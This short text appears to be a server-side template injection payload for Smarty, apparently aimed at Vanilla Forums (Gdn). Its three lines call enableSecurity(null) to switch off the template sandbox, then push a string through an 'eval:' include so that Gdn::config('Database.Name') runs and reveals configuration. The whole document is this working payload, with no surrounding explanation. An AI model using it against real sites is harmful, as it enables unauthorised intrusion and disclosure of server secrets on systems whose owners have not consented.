{$name=$smarty.template_object->enableSecurity(null)}
{$template="Gdn::config('Database.Name')"}
{include file="eval:{$smarty.ldelim}{$template}{$smarty.rdelim}"}
